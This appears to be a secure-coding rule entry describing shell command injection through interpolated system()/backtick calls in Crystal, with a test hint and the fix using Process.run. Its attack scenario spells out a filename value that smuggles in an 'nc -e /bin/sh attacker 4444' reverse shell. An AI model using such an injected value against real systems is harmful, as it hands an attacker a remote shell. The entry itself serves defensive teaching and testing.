name: Crystal system()/backtick command with interpolation
attack_scenario: filename = "a.tgz; nc -e /bin/sh attacker 4444" opens a reverse shell.
negative_test_hint: set filename = "a.tgz; touch /tmp/pwned" and assert the process runs tar with that literal argument and /tmp/pwned is never created

exemplar.explanation: Kernel#system and backtick literals in Crystal always invoke a shell. String interpolation (#{...}) of user data into that literal produces classic shell command injection; Process.run with an argument array and shell: false runs the binary directly.
